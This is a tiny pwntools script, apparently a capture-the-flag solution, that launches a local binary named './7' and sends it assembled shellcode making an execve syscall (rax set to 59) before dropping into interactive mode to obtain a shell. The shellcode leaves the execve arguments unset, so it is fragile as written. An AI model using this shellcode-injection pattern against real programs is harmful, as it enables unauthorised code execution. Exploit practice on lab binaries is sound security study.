from pwn import *

context(os='linux', arch='amd64', log_level='debug')

p = process('./7')
elf = ELF('./7')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


p.send(asm(
"""
mov rax, 59
push rax
syscall
"""
))

p.interactive()